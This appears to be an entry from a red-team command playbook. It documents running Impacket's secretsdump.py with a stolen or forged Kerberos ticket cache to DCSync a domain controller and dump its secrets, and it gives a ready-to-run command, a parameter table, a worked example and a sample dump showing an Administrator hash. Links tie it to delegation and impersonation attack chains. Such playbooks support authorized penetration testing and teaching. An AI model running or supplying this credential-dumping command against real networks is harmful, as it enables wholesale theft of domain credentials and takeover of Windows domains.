---
id: 93f5ed0a-9d06-479b-bd99-a7452d6b4629
name: secretsdump-connect-using-ticket
type: command
executor: bash
data: >-
  export KRB5CCNAME=$_TICKET_FILE && secretsdump.py -k -no-pass $_TARGET_SERVER
  -just-dc
output: null
created_at: '2023-04-06T03:56:05.533110+00:00'
updated_at: '2023-04-10T20:26:36.992508+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - kerberos
verified: true
validated: true
---

# secretsdump-connect-using-ticket

## Command

```bash
export KRB5CCNAME=$_TICKET_FILE && secretsdump.py -k -no-pass $_TARGET_SERVER -just-dc
```

## Description

Uses a Kerberos ticket cache to authenticate without password and dump DC secrets via DCSync.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| KRB5CCNAME | Path to ticket cache file (e.g., DOMAIN_ADMIN_USER_NAME.ccache) | Yes |
| -k | Use Kerberos authentication | Yes |
| -no-pass | No password prompt | Yes |
| $_TARGET_SERVER | Target server/DC FQDN | Yes |
| -just-dc | Dump DC-only secrets | Yes |
| $_TICKET_FILE | Ticket file path | Yes |

## Examples

### Basic Usage

```bash
export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
secretsdump.py -k -no-pass second-dc-server.local -just-dc
```

## Expected Output

Impersonated dump:

$ secretsdump.py ...
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
Administrator:500:...:::

## Related

- [[procedures/resource-based-constrained-delegation-via-printerbug]]
- [[commands/getst-impersonate-admin-ticket]]
